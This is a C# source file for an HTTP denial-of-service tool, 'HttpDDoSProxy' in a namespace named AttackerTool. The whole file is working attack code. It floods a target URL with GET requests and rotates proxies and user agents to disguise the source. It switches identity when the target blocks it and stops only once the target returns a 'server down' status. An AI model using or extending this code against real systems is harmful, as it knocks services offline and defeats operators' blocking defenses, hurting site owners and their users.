using System;
using System.Net;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Http;

namespace AttackerTool
{
    public static class HttpDDoSProxy
    {
        public static async Task Start(string targetUrl, ushort port, int limit)
        {
            Console.WriteLine($"The attack tool is starting attack to {targetUrl}:{port}");

            int count = 0;
            int userAgentIndex = 0;
            int proxyIndex = 0;

            while (count < limit)
            {
                try
                {
                    count++;

                    // set user agent
                    var userAgent = Settings.UserAgents[userAgentIndex];
                    userAgentIndex = (userAgentIndex + 1) % Settings.UserAgents.Length;

                    // get loop back ip address from the dictionary
                    var proxy = Settings.Proxies[proxyIndex];
                    proxyIndex = (proxyIndex + 1) % Settings.Proxies.Length;

                    // create http client handler with proxy
                    var handler = new HttpClientHandler
                    {
                        Proxy = new WebProxy(proxy),
                        UseProxy = true
                    };

                    // create http client for http request
                    using var client = new HttpClient(handler);

                    // create http request message to target url with http get method
                    var request = new HttpRequestMessage(HttpMethod.Get, $"{targetUrl}:{port}");

                    // add user agent to the header to simulate the request comes from different browser
                    request.Headers.UserAgent.ParseAdd(userAgent);

                    // time analysis for understand whether the server gonna be slow
                    Stopwatch stopwatch = Stopwatch.StartNew();

                    // send request to get response
                    HttpResponseMessage response = await client.SendAsync(request);

                    // stop time watching
                    stopwatch.Stop();

                    // Report to analysis the attack
                    Console.WriteLine($"Attack: {count}, Time: {stopwatch.ElapsedMilliseconds}ms, Response: {response.StatusCode}");

                    // change user agent and ip address just in case the request blocked
                    if (Settings.BlockedStatusCode.Contains(response.StatusCode))
                    {
                        userAgentIndex = (userAgentIndex + 1) % Settings.UserAgents.Length;
                        proxyIndex = (proxyIndex + 1) % Settings.Proxies.Length;
                    }

                    // check whether server is down
                    if (Settings.ServerDownCode.Contains(response.StatusCode))
                    {
                        Console.WriteLine("Server is down. The mission is completed.");
                        return;
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Exception: {ex.Message}");
                }
            }
        }
    }
}
